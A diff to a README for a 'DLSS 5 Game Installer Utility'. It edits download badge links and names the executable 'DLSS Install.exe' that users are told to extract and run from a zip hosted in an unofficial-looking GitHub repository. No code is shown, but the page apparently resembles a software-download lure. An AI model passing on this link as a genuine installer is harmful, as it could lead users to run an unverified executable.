@@ -2,9 +2,9 @@
 
 <p align="center">
   <a href="https://github.com/DLSS5-Game-Installer-Utility/.github/releases/download/1.0.0/DLSS5-Game-Installer-Utility-Windows-x64-v1.0.0.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD-DLSS%205%20INSTALLER-76B900?style=for-the-badge&logo=windows&logoColor=white" alt="DLSS 5 Installer for Windows">
+    <img src="https://img.shields.io/badge/DOWNLOAD-DLSS%205%20INSTALLER-76B900?style=for-the-badge&logo=windows&logoColor=white" alt="Download DLSS 5 Installer for Windows">
   </a>
-  <a href="https://github.com/DLSS5-Game-Installer-Utility/.github/releases/download/1.0.0/DLSS5-Game-Installer-Utility-Windows-x64-v1.0.0.zip">
+  <a href="https://github.com/DLSS5-Game-Installer-Utility/.github/releases">
     <img src="https://img.shields.io/badge/RELEASES-VERSIONS%20%26%20UPDATES-20232A?style=for-the-badge&logo=github&logoColor=white" alt="View Releases and Updates">
   </a>
 </p>
@@ -29,7 +29,7 @@ Download the latest available package using the button at the top of this page.
 
 **Package:** `DLSS5-Game-Installer-Utility-Windows-x64-v1.0.0.zip`
 
-The archive contains the Windows application. Extract the package and launch `.exe` to get started.
+The archive contains the Windows application. Extract the package and launch `DLSS Install.exe` to get started.
 
 - Portable application with no traditional installation wizard.
 - Automatic discovery of supported game libraries.
@@ -230,7 +230,7 @@ Keep the extracted files together, especially if the application package contain
 
 ### Step 3 — Launch the Installer
 
-Open `.exe`.
+Open `DLSS Install.exe`.
 
 The application will display its main interface, where you can scan your game libraries or add a game manually.
 
